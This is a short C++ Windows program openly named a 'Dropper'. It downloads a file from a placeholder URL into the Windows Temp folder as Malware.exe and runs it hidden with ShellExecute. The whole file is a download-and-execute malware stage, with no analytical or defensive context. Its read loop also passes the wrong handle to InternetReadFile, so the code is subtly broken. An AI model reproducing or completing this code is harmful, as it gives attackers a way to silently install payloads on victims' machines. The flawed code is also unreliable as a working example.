#include<iostream>
#include<Windows.h>
#include<wininet.h>

#pragma comment(lib,"wininet.lib")
using namespace std;

int main(){
    const wchar_t *url = L"URL";
    const wchar_t *filePath = L"c:\\windows\\Temp\\Malware.exe";

    HINTERNET hInternet = InternetOpen(
        L"Dropper",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );
    HINTERNET hURL = InternetOpenUrl(
        hInternet,
        url,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );

    if(!hInternet){
        cerr << "Failed to connect to the dropper service" << endl;
        InternetCloseHandle(hInternet);
        return 1;
    }
    if(!hURL){
        cerr << "Failed to open the url for the dropper service" << endl;
        InternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[1024];
    DWORD bytesRead;
    FILE *file;
    errno_t err = _wfopen_s(&file,filePath,L"wb");

    if(err != 0 || !file){
        wcerr << L"failed to write open the file" << endl;
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hURL);
        return 1;
    }

    while(InternetReadFile(hInternet,buffer,sizeof(buffer),&bytesRead) && bytesRead > 0){
        fwrite(buffer,1,bytesRead,file);
    }
    fclose(file);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);

    ShellExecute(NULL,L"open",filePath,NULL,NULL,SW_HIDE);

    return 0;
}
